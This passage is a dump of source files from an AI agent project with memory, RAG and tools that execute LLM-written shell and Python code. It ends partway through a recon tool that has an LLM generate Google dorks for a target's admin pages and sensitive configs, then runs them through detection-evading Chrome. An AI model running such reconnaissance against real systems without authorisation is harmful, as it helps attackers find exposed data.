        invoked_tools: Optional[List[str]] = None
    ):
        self.history.append({"role": "user", "content": message})

        sys_msg = self._system_with_examples()
        if invoked_tools:
            sys_msg += (
                "\n\n[Tool Context] "
                f"{', '.join(invoked_tools)} results are available above.\n"
            )

        context = [{"role": "system", "content": sys_msg}] + self.history[1:]
        return self.client.chat(model=self.model, messages=context, stream=stream)

    # =======================
    # Code helpers
    # =======================
    def _gen_code(self, prompt: str) -> str:
        resp = self.client.chat(model=self.model, messages=[{"role": "user", "content": prompt}])
        return str(resp).strip()

    def generate_shell_command(self, prompt: str) -> str:
        return RunShellTool.extract_code(self._gen_code(prompt))

    def generate_python_code(self, prompt: str) -> str:
        return RunPythonTool.extract_code(self._gen_code(prompt))

    # =======================
    # Task execution
    # =======================
    def run_shell_task(
        self, prompt: str, memory_reflection: Optional[str] = None, summarize: bool = False
    ) -> Tuple[str, str, Any, Optional[str]]:
        enhanced = self._format_prompt(prompt, memory_reflection, "shell")
        cmd = self.generate_shell_command(enhanced)
        result, success = self.tools.run("run_shell_command", cmd, return_success=True, elf=self)
        summary = self.summarize_text(result) if summarize else None
        return cmd, result, success, summary

    def run_python_task(
        self, prompt: str, memory_reflection: Optional[str] = None, summarize: bool = False
    ) -> Tuple[str, Any, Any, Optional[str]]:
        enhanced = self._format_prompt(prompt, memory_reflection, "Python")
        code = self.generate_python_code(enhanced)
        result, success = self.tools.run("run_python_code", code, elf=self, return_success=True)
        summary = self.summarize_text(result) if summarize else None
        return code, result, success, summary

    # =======================
    # Helpers
    # =======================
    @staticmethod
    def _format_prompt(prompt: str, memory_reflection: Optional[str], code_type: str) -> str:
        base = f"User request: {prompt}\n\n"
        close = f"Now produce valid {code_type} code only. Comments allowed."
        return base + (f"Relevant past {code_type} attempts:\n{memory_reflection}\n\n" if memory_reflection else "") + close

    def summarize_text(self, text: str) -> str:
        summary_prompt = f"Summarize this text in {self.personality}'s style:\n\n{text}"
        out = self.client.chat(model=self.model, messages=[{"role": "user", "content": summary_prompt}])
        return str(out).strip()

```

## `build/lib/core/memory/__init__.py`

```python
from core.memory.memory import UnifiedMemory
```

## `build/lib/core/memory/memory.py`

```python
# core/memory/memory.py
# UnifiedMemory: Manages short-term and long-term memory using SQLite and FAISS.

import sqlite3, json, time, hashlib
from pathlib import Path
from typing import Optional, List, Dict
import numpy as np
import faiss
from openai import OpenAI

# ---- Helpers ----
def now() -> int:
    return int(time.time())

def normalize(vec: np.ndarray) -> np.ndarray:
    vec = vec.astype("float32")
    norm = np.linalg.norm(vec)
    return vec / (norm + 1e-8)

# ---- UnifiedMemory ----
class UnifiedMemory:
    def __init__(self, db_path: Path, model="text-embedding-3-large", debug=False):
        """db_path: SQLite file, model: embedding model (default: 3-large)."""
        self.debug = debug
        self.db_path = Path(db_path)
        if self.debug: print(f"db_path: {self.db_path}")
        self.model = model
        if self.debug: print(f"model: {self.model}")
        self.client = OpenAI()

        # FAISS indexes
        self.long_index = None
        self.rag_index = None
        self.long_id_map: List[int] = []
        self.rag_id_map: List[int] = []

        # Ensure DB and schema

        self._ensure_db()

        self._rebuild_indexes()

    # ----- Schema -----
    def _ensure_db(self):
        with sqlite3.connect(self.db_path) as con:
            con.executescript("""
            PRAGMA journal_mode=WAL;
            CREATE TABLE IF NOT EXISTS meta(
                k TEXT PRIMARY KEY,
                v TEXT
            );
            CREATE TABLE IF NOT EXISTS short_term(
                id INTEGER PRIMARY KEY,
                role TEXT, content TEXT, ts INTEGER
            );
            CREATE TABLE IF NOT EXISTS long_term(
                id INTEGER PRIMARY KEY,
                role TEXT, content TEXT,
                embedding BLOB, meta TEXT, ts INTEGER
            );
            CREATE TABLE IF NOT EXISTS rag_chunks(
                id INTEGER PRIMARY KEY,
                dir TEXT, file TEXT, chunk_index INT,
                content TEXT, embedding BLOB,
                sha TEXT, ts INTEGER
            );
            CREATE TABLE IF NOT EXISTS adventures(
                id INTEGER PRIMARY KEY,
                prompt TEXT, code TEXT, result TEXT,
                mode TEXT, success INT, ts INTEGER
            );
            """)
        # model lock on first use
        self._ensure_model_lock()

    def _ensure_model_lock(self):
        with sqlite3.connect(self.db_path) as con:
            cur = con.execute("SELECT v FROM meta WHERE k='embedding_model'")
            row = cur.fetchone()
            if row is None:
                con.execute("INSERT INTO meta(k, v) VALUES('embedding_model', ?)", (self.model,))
            else:
                saved = row[0]
                if saved != self.model:
                    raise RuntimeError(
                        f"Embedding model mismatch.\n"
                        f"DB locked to: {saved}\n"
                        f"Requested:   {self.model}\n"
                        f"Choose the same model or run a migration (re-embed)."
                    )

    # ----- Connection Helper -----
    def _connect(self):
        """Helper to open SQLite connection consistently."""
        return sqlite3.connect(self.db_path)


    # ----- Embedding -----
    def _embed(self, text: str) -> np.ndarray:
        """Embed a text string safely (hard-cut to avoid token overflows)."""
        text = text[:8000]  # defensive cap; chunking should keep us below this anyway
        resp = self.client.embeddings.create(input=text, model=self.model)
        return np.array(resp.data[0].embedding, dtype=np.float32)

    # ----- Short Term -----
    def add_short(self, role: str, content: str):
        with sqlite3.connect(self.db_path) as con:
            con.execute("INSERT INTO short_term(role,content,ts) VALUES(?,?,?)",
                        (role, content, now()))

    def load_short(self, n=20) -> List[Dict]:
        with sqlite3.connect(self.db_path) as con:
            rows = con.execute(
                "SELECT role,content FROM short_term ORDER BY id DESC LIMIT ?",
                (n,)
            ).fetchall()
        return [{"role": r, "content": c} for r, c in reversed(rows)]

    def reset_short(self):
        with sqlite3.connect(self.db_path) as con:
            con.execute("DELETE FROM short_term")

    # ----- Long Term -----
    def add_long(self, role: str, content: str, meta: Optional[dict] = None):
        emb = normalize(self._embed(content))
        with sqlite3.connect(self.db_path) as con:
            cur = con.execute(
                "INSERT INTO long_term(role,content,embedding,meta,ts) VALUES(?,?,?,?,?)",
                (role, content, emb.tobytes(), json.dumps(meta or {}), now())
            )
            rid = cur.lastrowid
        # Update FAISS
        if self.long_index is None:
            self.long_index = faiss.IndexFlatIP(len(emb))
        self.long_index.add(emb.reshape(1, -1))
        self.long_id_map.append(rid)

    def search_long(self, query: str, top_k=3) -> List[Dict]:
        if self.long_index is None:
            return []
        q = normalize(self._embed(query))
        D, I = self.long_index.search(q.reshape(1, -1), top_k)
        results = []
        with sqlite3.connect(self.db_path) as con:
            for idx in I[0]:
                if idx < 0 or idx >= len(self.long_id_map):
                    continue
                rid = self.long_id_map[idx]
                row = con.execute(
                    "SELECT role,content FROM long_term WHERE id=?",
                    (rid,)
                ).fetchone()
                if row:
                    results.append({"role": row[0], "content": row[1]})
        return results

    def purge_long(self):
        with sqlite3.connect(self.db_path) as con:
            con.execute("DELETE FROM long_term")
        self.long_index = None
        self.long_id_map = []

    # ----- RAG helpers -----
    @staticmethod
    def _hash_file(path: Path) -> str:
        return hashlib.sha256(path.read_bytes()).hexdigest()

    # ----- RAG: search / manage -----
    def search_rag(self, query: str, top_k=6, dir_filter: Optional[str] = None):
        """Semantic search over RAG chunks, returning content + source metadata."""
        if self.rag_index is None:
            return []

        q = normalize(self._embed(query))
        D, I = self.rag_index.search(q.reshape(1, -1), top_k)

        dir_root = None
        if dir_filter:
            dir_root = str(Path(dir_filter).expanduser().resolve())

        results = []
        with sqlite3.connect(self.db_path) as con:
            for idx, score in zip(I[0], D[0]):
                if idx < 0 or idx >= len(self.rag_id_map):
                    continue
                cid = self.rag_id_map[idx]
                row = con.execute(
                    "SELECT dir,file,chunk_index,content FROM rag_chunks WHERE id=?",
                    (cid,)
                ).fetchone()
                if not row:
                    continue
                d, f, chunk, content = row
                f_abs = str(Path(f).resolve())
                if dir_root and not f_abs.startswith(dir_root + "/") and f_abs != dir_root:
                    continue
                results.append({
                    "dir": d,
                    "file": f_abs,
                    "chunk": chunk,
                    "content": content,
                    "score": float(score)
                })
        # sort by score (cosine similarity)
        results.sort(key=lambda r: r["score"], reverse=True)
        return results

    def delete_rag(self, target: Path):
        """Delete all chunks from a given file or directory and rebuild FAISS."""
        target = Path(target).expanduser().resolve()
        with sqlite3.connect(self.db_path) as con:
            if target.is_file():
                con.execute("DELETE FROM rag_chunks WHERE file=?", (str(target),))
            else:
                con.execute("DELETE FROM rag_chunks WHERE dir=?", (str(target),))
        self._rebuild_rag_index()

    def overwrite_rag(self, target: Path):
        """Delete existing RAG entries for target, then re-crawl."""
        self.delete_rag(target)
        if target.is_file():
            return self.crawl_file(target)
        else:
            return self.crawl_dir(target)

    def rag_status(self):
        """Return a summary of RAG contents: directories, files, and chunk counts."""
        with sqlite3.connect(self.db_path) as con:
            rows = con.execute("""
                SELECT dir, file, COUNT(*) as chunks
                FROM rag_chunks
                GROUP BY dir, file
                ORDER BY dir, file
            """).fetchall()
        status: Dict[str, List[Dict]] = {}
        for d, f, c in rows:
            status.setdefault(d, []).append({"file": f, "chunks": c})
        return status

    # ----- Index Rebuild -----
    def _rebuild_indexes(self):
        self._rebuild_long_index()
        self._rebuild_rag_index()

    def _rebuild_long_index(self):
        with sqlite3.connect(self.db_path) as con:
            rows = con.execute("SELECT id,embedding FROM long_term").fetchall()
        if not rows:
            self.long_index = None
            self.long_id_map = []
            return
        dim = len(np.frombuffer(rows[0][1], dtype=np.float32))
        self.long_index = faiss.IndexFlatIP(dim)
        self.long_id_map = []
        vecs = []
        for rid, eblob in rows:
            v = normalize(np.frombuffer(eblob, dtype=np.float32))
            vecs.append(v)
            self.long_id_map.append(rid)
        self.long_index.add(np.stack(vecs))

    def _rebuild_rag_index(self):
        with sqlite3.connect(self.db_path) as con:
            rows = con.execute("SELECT id,embedding FROM rag_chunks").fetchall()
        if not rows:
            self.rag_index = None
            self.rag_id_map = []
            return
        dim = len(np.frombuffer(rows[0][1], dtype=np.float32))
        self.rag_index = faiss.IndexFlatIP(dim)
        self.rag_id_map = []
        vecs = []
        for rid, eblob in rows:
            v = normalize(np.frombuffer(eblob, dtype=np.float32))
            vecs.append(v)
            self.rag_id_map.append(rid)
        self.rag_index.add(np.stack(vecs))

    # ----- Adventures -----
    def add_adventure(self, prompt: str, code: str, result: str, mode: str, success: bool):
        """Insert a coding adventure into the adventures table."""
        with sqlite3.connect(self.db_path) as con:
            con.execute(
                "INSERT INTO adventures(prompt,code,result,mode,success,ts) VALUES(?,?,?,?,?,?)",
                (prompt, code, result, mode, int(success), now())
            )

    def list_adventures(self, n: int = 10) -> List[Dict]:
        """Return the last N adventures in chronological order (oldest first)."""
        with sqlite3.connect(self.db_path) as con:
            rows = con.execute(
                "SELECT prompt,code,result,mode,success,ts FROM adventures ORDER BY id DESC LIMIT ?",
                (n,)
            ).fetchall()
        # reverse so oldest → newest
        return [
            {
                "prompt": r[0],
                "code": r[1],
                "result": r[2],
                "mode": r[3],
                "success": bool(r[4]),
                "ts": r[5],
            }
            for r in reversed(rows)
        ]




```

## `build/lib/core/tools/__init__.py`

```python
# core/tools/__init__.py

from core.tools.tool import Tool
from .run_shell import RunShellTool
from .run_python import RunPythonTool
from .install_project import InstallProjectTool
from .fetch_page import FetchPageTool
from .web_search import WebSearchTool
from .rag_crawler import RagCrawlerTool
from core.memory.memory import UnifiedMemory
from typing import Callable, Union


class Tools:
    """
    Core tool registry.
    By default, excludes TTS (speak_text) unless explicitly registered at runtime.
    """

    def __init__(self, elfenv=None, memory: UnifiedMemory = None, enable_voice=False):
        self.elfenv = elfenv
        self.registry: dict[str, Union[Tool, Callable[[], Tool]]] = {}

        # Always-available tools
        self._register(RunShellTool())
        self._register(RunPythonTool(elfenv=elfenv))
        self._register(InstallProjectTool(elfenv=elfenv))
        self._register(FetchPageTool())
        self._register(WebSearchTool())

        if memory:
            self._register(RagCrawlerTool(memory))

        # Only load voice if explicitly enabled
        if enable_voice:
            self._register_lazy("speak_text", self._lazy_load_speak_text)

    # ------------------- registration helpers -------------------

    def _register(self, _tool: Tool):
        self.registry[_tool.name] = _tool

    def _register_lazy(self, name: str, factory: Callable[[], Tool]):
        self.registry[name] = factory

    # ------------------- lazy voice load -------------------

    @staticmethod
    def _lazy_load_speak_text():
        """Dynamically import the Coqui TTS voice tool."""
        try:
            from core.tools.voice import SpeakTextTool
            return SpeakTextTool()
        except ImportError:
            class DummySpeakTool(Tool):
                name = "speak_text"
                description = "Dummy voice tool (TTS not installed)."

                def __call__(self, *args, **kwargs):
                    return "⚠️ Voice output disabled (TTS not installed)."

            return DummySpeakTool()

    # ------------------- tool management -------------------

    def list_tools(self):
        return list(self.registry.keys())

    def get_tool(self, name: str):
        tool = self.registry.get(name)
        if tool is None:
            return None
        if callable(tool) and not isinstance(tool, Tool):
            tool_instance = tool()
            self.registry[name] = tool_instance
            return tool_instance
        return tool

    def describe_tool(self, name: str):
        _tool = self.get_tool(name)
        return _tool.info() if _tool else {"error": f"No such tool: {name}"}

    def run(self, name: str, *args, **kwargs):
        _tool = self.get_tool(name)
        if not _tool:
            raise ValueError(f"No such tool: {name}")

        result = _tool(*args, **kwargs)

        # --- Tool awareness injection ---
        elf = kwargs.get("elf")
        if elf:
            arg_summary = ", ".join(map(str, args))
            kwarg_summary = ", ".join(f"{k}={v}" for k, v in kwargs.items() if k != "elf")
            arg_text = "; ".join(filter(None, [arg_summary, kwarg_summary]))
            result_str = str(result)
            if len(result_str) > 500:
                result_str = result_str[:500] + "…"
            elf.history.append({
                "role": "assistant",
                "content": (
                    f"🤖 (Tool used: {name})\n"
                    f"Args: {arg_text or 'none'}\n"
                    f"Result (truncated):\n{result_str}"
                )
            })
        return result

```

## `build/lib/core/tools/base_subprocess.py`

```python
# core/tools/base_subprocess.py

from __future__ import annotations

from abc import ABC, abstractmethod
import subprocess
import os
import shlex
from typing import Any, Tuple, Optional

from core.tools.tool import Tool


class RunSubprocessTool(Tool, ABC):
    """
    Base class for tools that execute subprocess-like operations with robust retries.
    - Centralizes attempt/retry loop, sudo fallback, timeouts, progress logging.
    - Defers language/tool-specific pieces (dependency detection/installation, repair)
      to subclasses via template methods.

    Subclasses implement:
      - _attempt(payload) -> (rc, out, err)
      - _sudo_attempt(payload) -> (rc, out, err)  (optional: default wraps _attempt)
      - _detect_missing_dependency(err) -> dep_name|None
      - _install_dependency(dep_name) -> bool
      - _repair(payload, err) -> new_payload
      - _describe(payload) -> str   (for friendly progress logs)
    """

    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.name = "run_subprocess"
        self.description = (
            "Runs a subprocess command and returns its output. Handles retries, sudo, timeouts, and errors."
        )
        self.unsafe = kwargs.get("unsafe", True)
        self.return_success = kwargs.get("return_success", False)
        self.timeout = kwargs.get("timeout", 120)
        self.check_root = kwargs.get("check_root", False)
        # For direct shell execution convenience (used by run() when cmd is str)
        self.executable = kwargs.get("executable", "/bin/bash")
        self.elf = kwargs.get("elf", None)  # Optional elf object for sudo permission checks

    # -----------------------------
    # Shared low-level runner
    # -----------------------------
    def run(self, cmd, timeout: Optional[int] = None) -> Tuple[int, str, str]:
        """
        Execute a command as a subprocess.
        Returns: (return_code, stdout, stderr)
        """
        timeout = timeout or self.timeout
        shell_mode = isinstance(cmd, str)

        try:
            result = subprocess.run(
                cmd,
                shell=shell_mode,
                text=True,
                capture_output=True,
                timeout=timeout,
                executable=self.executable if shell_mode else None,
            )
            return result.returncode, (result.stdout or "").strip(), (result.stderr or "").strip()
        except subprocess.TimeoutExpired:
            return -1, "", "⏱️ Subprocess timed out"
        except Exception as ex:
            return -1, "", self._format_exception(ex)

    # -----------------------------
    # Orchestrator (retry loop)
    # -----------------------------
    def _run_with_retries(
        self,
        payload: Any,
        *,
        max_retries: int = 5,
        unsafe: bool = True,
        return_success: bool = False,
    ):
        """
        Orchestrate attempts with clear logs, optional dependency recovery,
        sudo fallback on permission errors, and code/command repair on failure.
        """
        attempt = 0
        current_payload = payload

        while attempt <= max_retries:
            step = attempt + 1
            total = max_retries + 1
            self._log(f"🔁 Attempt {step}/{total}: {self._describe(current_payload)}")

            rc, out, err = self._attempt(current_payload)

            if rc == 0:
                self._log(f"✅ Success on attempt {step}")
                return (out, 1) if return_success else out

            # Failure path:
            # 1) Timeout / general error message
            self._log(f"❌ Error: {err or 'Unknown error'}")

            # 2) Missing dependency hook (subclass may choose to install)
            if unsafe:
                missing = self._detect_missing_dependency(err)
                if missing:
                    self._log(f"📦 Missing dependency detected: {missing} — installing…")
                    if self._install_dependency(missing):
                        self._log("📦 Install complete. Retrying…")
                        attempt += 1
                        continue
                    else:
                        self._log("❌ Dependency installation failed.")

            # 3) Permission error → sudo fallback
            if self._is_permission_error(err) and not self.is_root():
                self._log("⚠️ Permission error detected — attempting sudo fallback.")
                if self.ask_for_sudo_permission(self.elf):
                    rc2, out2, err2 = self._sudo_attempt(current_payload)
                    if rc2 == 0:
                        self._log("✅ Success with sudo.")
                        return (out2, 1) if return_success else out2
                    self._log(f"❌ Sudo run failed: {err2 or 'Unknown error'}")
                else:
                    self._log("🚫 Sudo permission denied by user.")
                    return ("❌ Permission denied", 0) if return_success else "❌ Permission denied"

            # 4) Attempt repair (subclass provided) if we still have retries left
            if attempt < max_retries:
                repaired = self._repair(current_payload, err)
                if repaired is not None and repaired != current_payload:
                    self._log("🔧 Applied repair. Retrying…")
                    current_payload = repaired
                    attempt += 1
                    continue

            # 5) Give up
            self._log(f"🛑 Giving up after {step} attempt(s).")
            return (f"{err or 'Execution failed'}", 0) if return_success else (err or "Execution failed")

        return ("❌ Could not fix or execute", 0) if return_success else "❌ Could not fix or execute"

    # -----------------------------
    # Template methods for subclasses
    # -----------------------------
    @abstractmethod
    def _attempt(self, payload: Any) -> Tuple[int, str, str]:
        """Perform one attempt. Return (rc, out, err)."""
        raise NotImplementedError

    def _sudo_attempt(self, payload: Any) -> Tuple[int, str, str]:
        """Default sudo attempt simply wraps a best-effort sudo around the same payload if possible."""
        # By default, delegate to _attempt — subclasses that can re-run with sudo should override.
        return self._attempt(payload)

    def _detect_missing_dependency(self, err: str) -> Optional[str]:
        """Return the missing dependency/package name if detectable, else None."""
        return None

    def _install_dependency(self, name: str) -> bool:
        """Install a dependency. Subclasses override to implement language/system specifics."""
        return False

    def _repair(self, payload: Any, err: str) -> Any:
        """Attempt to repair payload (e.g., code fix). Return new payload or original/no-op."""
        return payload

    def _describe(self, payload: Any) -> str:
        """Human-readable description of the payload for progress logs."""
        return str(payload)

    # -----------------------------
    # Helpers
    # -----------------------------
    @staticmethod
    def is_root() -> bool:
        try:
            return os.geteuid() == 0
        except AttributeError:
            # Windows compatibility fallback
            return os.name == "nt" and "ADMIN" in os.environ.get("USERNAME", "").upper()

    @staticmethod
    def _format_exception(ex: Exception) -> str:
        return f"⚠️ Unexpected error: {type(ex).__name__}: {str(ex)}"

    def requires_root(self) -> bool:
        return self.check_root and not self.is_root()

    @staticmethod
    def ask_for_sudo_permission(elf) -> bool:
        import random
        try:
            if hasattr(elf, "personality") and str(elf.personality).lower().startswith("judais"):
                prompt = random.choice(
                    [
                        "JudAIs requests root access. Confirm?",
                        "Elevated permission required. Shall I proceed?",
                        "System integrity override. Approve sudo access?",
                    ]
                )
            else:
                prompt = random.choice(
                    [
                        "Precious, Lobi needs your blessing to weave powerful magics...",
                        "Without sudo, precious, Lobi cannot poke the network bits!",
                        "Dangerous tricksies need root access... Will you trust Lobi?",
                    ]
                )
            return input(f"⚠️ {prompt} (yes/no) ").strip().lower() in ["yes", "y"]
        except EOFError:
            return False

    @staticmethod
    def _is_permission_error(err: str) -> bool:
        if not err:
            return False
        low = err.lower()
        return any(
            term in low for term in ["permission denied", "must be run as root", "operation not permitted"]
        )

    @staticmethod
    def extract_code(text: str, language: str | None = None) -> str:
        """
        Extracts code blocks from markdown-like text using language-specific or generic patterns.
        """
        import re

        if language:
            match = re.search(rf"```{language}\n(.*?)```", text, re.DOTALL)
            if match:
                return match.group(1).strip()

        match = re.search(r"```(.+?)```", text, re.DOTALL)
        if match:
            return match.group(1).strip()

        match = re.search(r"`([^`]+)`", text)
        if match:
            return match.group(1).strip()

        return text.strip()

    def _log(self, msg: str) -> None:
        # Minimal, unbuffered progress logging to stdout so the CLI shows activity.
        print(msg, flush=True)

    # Utilities for subclasses that need to add 'sudo' to a command
    @staticmethod
    def _prepend_sudo(cmd):
        if isinstance(cmd, str):
            # Only add sudo if not already present at the front (be conservative)
            parts = shlex.split(cmd)
            if parts and parts[0] != "sudo":
                return "sudo " + cmd
            return cmd
        elif isinstance(cmd, list):
            return ["sudo"] + cmd if (not cmd or cmd[0] != "sudo") else cmd
        else:
            return cmd

```

## `build/lib/core/tools/fetch_page.py`

```python
# tools/fetch_page.py

from core.tools.tool import Tool
import requests
from bs4 import BeautifulSoup

class FetchPageTool(Tool):
    name = "fetch_page_content"
    description = "Fetches and extracts visible text from the given URL."

    def __call__(self, url):
        try:
            res = requests.get(url, headers={"User-Agent": "Mozilla/5.0"})
            soup = BeautifulSoup(res.text, 'html.parser')
            return ' '.join(p.get_text() for p in soup.find_all('p'))
        except Exception as e:
            return f"Failed to fetch or parse: {str(e)}"

```

## `build/lib/core/tools/install_project.py`

```python
# tools/install_project.py

from core.tools.base_subprocess import RunSubprocessTool
from pathlib import Path
from typing import Tuple, Any


class InstallProjectTool(RunSubprocessTool):
    name = "install_project"
    description = (
        "Installs a Python project into the current elfenv using setup.py, "
        "pyproject.toml, or requirements.txt."
    )

    def __init__(self, **kwargs):
        self.elfenv = kwargs.get("elfenv", Path(".elfenv"))
        self.pip_bin = self.elfenv / "bin" / "pip"
        self.ensure_elfenv()
        super().__init__(**kwargs)

    def __call__(self, path="."):
        """
        Public entry point: tries to install the given project and returns human-readable output.
        """
        return self._run_with_retries(path, max_retries=1, unsafe=False, return_success=False)

    # ---------- Template overrides ----------
    def _attempt(self, payload: Any) -> Tuple[int, str, str]:
        """
        payload = path to project directory
        """
        path = Path(payload)
        if (path / "setup.py").exists():
            cmd = [str(self.pip_bin), "install", "."]
        elif (path / "pyproject.toml").exists():
            cmd = [str(self.pip_bin), "install", "."]
        elif (path / "requirements.txt").exists():
            cmd = [str(self.pip_bin), "install", "-r", "requirements.txt"]
        else:
            return 1, "", "❌ No installable project found in the given directory."

        return self.run(cmd, timeout=300)

    def _describe(self, payload: Any) -> str:
        return f"install project at {payload}"

    # ---------- Helpers ----------
    def ensure_elfenv(self):
        from venv import create
        if not self.pip_bin.exists():
            self._log(f"🧙 Creating venv at {self.elfenv} …")
            create(str(self.elfenv), with_pip=True)

```

## `build/lib/core/tools/rag_crawler.py`

```python
# core/tools/rag_crawler.py
# Manage RAG archive: crawl, overwrite, list, status, delete. Summarize crawls with LLM.

from pathlib import Path
from typing import Optional, List, Dict
from core.tools.tool import Tool
from core.memory.memory import UnifiedMemory
from openai import OpenAI
import faiss, numpy as np, hashlib, time

# optional deps
try:
    from pypdf import PdfReader
except ImportError:
    PdfReader = None
try:
    import docx
except ImportError:
    docx = None
try:
    import tiktoken
    enc = tiktoken.encoding_for_model("text-embedding-3-large")
except Exception:
    enc = None

def now() -> int: return int(time.time())
def normalize(vec: np.ndarray) -> np.ndarray:
    vec = vec.astype("float32"); return vec / (np.linalg.norm(vec) + 1e-8)

# ---- Local file readers ----
def read_file(path: Path) -> str:
    ext = path.suffix.lower()
    if ext == ".pdf" and PdfReader:
        try:
            return "\n".join([p.extract_text() or "" for p in PdfReader(str(path)).pages])
        except Exception:
            return ""
    if ext == ".docx" and docx:
        try:
            d = docx.Document(str(path))
            return "\n".join([p.text for p in d.paragraphs])
        except Exception:
            return ""
    try:
        return path.read_text(errors="ignore")
    except Exception:
        return ""

def chunk_text(text: str, max_chars=800, overlap=100):
    chunks, buf = [], ""
    for para in text.split("\n\n"):
        if len(buf) + len(para) < max_chars:
            buf += "\n\n" + para
        else:
            if buf.strip():
                chunks.append(buf.strip())
            buf = para
    if buf.strip():
        chunks.append(buf.strip())
    # add overlap
    if overlap and len(chunks) > 1:
        out = []
        for i, c in enumerate(chunks):
            if i > 0:
                out.append(chunks[i-1][-overlap:] + "\n" + c)
            else:
                out.append(c)
        return out
    return chunks

def safe_chunk_text(text: str, max_tokens=2000, overlap=200):
    if not text.strip():
        return []
    if not enc:
        return chunk_text(text, max_chars=2000, overlap=200)
    tokens = enc.encode(text)
    step = max_tokens - overlap
    return [enc.decode(tokens[i:i+max_tokens]) for i in range(0, len(tokens), step)]

# ---- Tool ----
class RagCrawlerTool(Tool):
    name = "rag_crawl"
    description = "Manage RAG archive: crawl, overwrite, list, status, delete. Summarize crawls with LLM."

    def __init__(self, memory: UnifiedMemory, model="gpt-5-mini", debug=True):
        super().__init__()
        self.memory = memory
        self.debug = debug
        self.client = OpenAI()
        self.model = model

    # --- low-level helpers ---
    def _hash_file(self, path: Path) -> str:
        return hashlib.sha256(path.read_bytes()).hexdigest()

    def _embed(self, text: str) -> np.ndarray:
        resp = self.client.embeddings.create(input=text[:8000], model="text-embedding-3-large")
        return np.array(resp.data[0].embedding, dtype=np.float32)

    def _crawl_file(self, file_path: Path):
        """Index a single file into rag_chunks."""
        file_path = Path(file_path).expanduser().resolve()
        if not file_path.is_file():
            return []
        text = read_file(file_path)
        if not text.strip():
            return []

        sha = self._hash_file(file_path)
        file_abs, dir_abs = str(file_path), str(file_path.parent.resolve())
        added_chunks = []

        with self.memory._connect() as con:
            exists = con.execute(
                "SELECT 1 FROM rag_chunks WHERE file=? AND sha=?",
                (file_abs, sha)
            ).fetchone()
            if exists:
                return []

            for i, c in enumerate(safe_chunk_text(text)):
                emb = normalize(self._embed(c))
                cur = con.execute(
                    "INSERT INTO rag_chunks(dir,file,chunk_index,content,embedding,sha,ts) VALUES(?,?,?,?,?,?,?)",
                    (dir_abs, file_abs, i, c, emb.tobytes(), sha, now())
                )
                cid = cur.lastrowid
                if self.memory.rag_index is None:
                    self.memory.rag_index = faiss.IndexFlatIP(len(emb))
                self.memory.rag_index.add(emb.reshape(1, -1))
                self.memory.rag_id_map.append(cid)
                added_chunks.append({"file": file_abs, "chunk": i, "content": c})
        return added_chunks

    # --- main entry point ---
    def __call__(self, action: str, user_message: str = "",
                 dir: Optional[str] = None, file: Optional[str] = None,
                 recursive: bool = False):
        """
        Dispatch archive actions: crawl, overwrite, list, status, delete.
        Adds explicit (Tool used: rag_crawl) markers into short-term memory
        so the LLM can see what just happened.
        """
        tag = "🤖 (Tool used: rag_crawl)"

        if action in ("crawl", "overwrite"):
            if action == "overwrite":
                target = Path(file or dir).expanduser().resolve()
                self.memory.delete_rag(target)

            crawled = []
            if file:
                crawled = self._crawl_file(Path(file))
            elif dir:
                root = Path(dir).expanduser().resolve()
                iterator = root.rglob("*") if recursive else root.glob("*")
                for f in iterator:
                    if f.is_file():
                        crawled.extend(self._crawl_file(f))

            if not crawled:
                msg = f"{tag} No new chunks found for {file or dir}"
                self.memory.add_short("system", msg)
                return {"status": "no new chunks"}

            joined = "\n".join(c["content"] for c in crawled[:10])
            prompt = (
                f"You just {action}d {len(crawled)} chunks from {file or dir}.\n\n"
                f"Summarize the main topics or ideas."
            )
            summary = self.client.chat.completions.create(
                model=self.model,
                messages=[{"role": "user", "content": prompt + "\n\nSample:\n" + joined}]
            ).choices[0].message.content.strip()

            reflection = f"{tag} 📚 {action.title()}ed {file or dir}: {summary}"
            self.memory.add_long("system", reflection)
            self.memory.add_short("system", reflection)
            return {"status": action, "chunks": len(crawled), "summary": summary}

        elif action == "list":
            with self.memory._connect() as con:
                cur = con.execute("SELECT DISTINCT dir FROM rag_chunks")
                rows = [r[0] for r in cur.fetchall()]
            reflection = f"{tag} 📚 Archive list: {len(rows)} directories"
            self.memory.add_short("system", reflection)
            return {"status": "list", "dirs": rows}

        elif action == "status":
            status = self.memory.rag_status()
            reflection = f"{tag} 📚 Archive status checked ({len(status)} dirs)."
            self.memory.add_short("system", reflection)
            return {"status": "status", "detail": status}

        elif action == "delete":
            if not (file or dir):
                return {"status": "error", "msg": "delete requires --dir or --file"}
            target = Path(file or dir).expanduser().resolve()
            self.memory.delete_rag(target)
            reflection = f"{tag} 🗑️ Deleted RAG entries for {target}"
            self.memory.add_short("system", reflection)
            return {"status": "delete", "target": str(target)}

        else:
            return {"status": "error", "msg": f"Unknown action: {action}"}

```

## `build/lib/core/tools/recon/__init__.py`

```python
# tools/recon/recon_tool.py
from abc import ABC

from core.tools.tool import Tool

class ReconTool(Tool, ABC):
    """Base class for all Recon Tools with shared utilities like context summarization."""

    @staticmethod
    def summarize_context(target_package: dict) -> str:
        sections = []
        for key, value in target_package.items():
            if key == "target":
                continue
            if isinstance(value, dict):
                sections.append(f"### {key}:\n" + "\n".join(f"- {k}: {v}" for k, v in value.items() if isinstance(v, str)))
            elif isinstance(value, list):
                sections.append(f"### {key}:\n" + "\n".join(f"- {v}" for v in value if isinstance(v, str)))
            else:
                sections.append(f"- {key}: {value}")
        return "\n\n".join(sections) or "(No additional context)"

```

## `build/lib/core/tools/recon/google_hacks.py`

```python
import time, random
from urllib.parse import quote
from core.tools.recon import ReconTool
import undetected_chromedriver as uc
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys

class GoogleHacksTool(ReconTool):
    name = "google_hacks"
    description = "Uses LLM to generate Google dorks and performs cloaked searches using undetected Chrome."

    def __call__(self, target_package: dict, elf=None, use_llm=True, max_queries=5) -> dict:
        try:
            target = target_package.get("target", "")
            context = self.summarize_context(target_package)
            queries = []

            if use_llm and elf:
                prompt = f"""You are an expert OSINT recon agent.

Target: {target}

Context from previous reconnaissance:
{context}

Generate up to {max_queries} Google dork queries that could reveal public files, admin pages, sensitive configs, or exposed endpoints. Only return the dorks, one per line."""
                response = elf.client.chat.completions.create(
                    model=elf.model,
                    messages=[
                        {"role": "system", "content": "Generate advanced Google dorks."},
                        {"role": "user", "content": prompt}
                    ]
                )
                queries = [
                    line.strip().strip("`")
                    for line in response.choices[0].message.content.strip().splitlines()
                    if line.strip() and not line.strip().startswith("```")
                ]
            else:
                queries = [
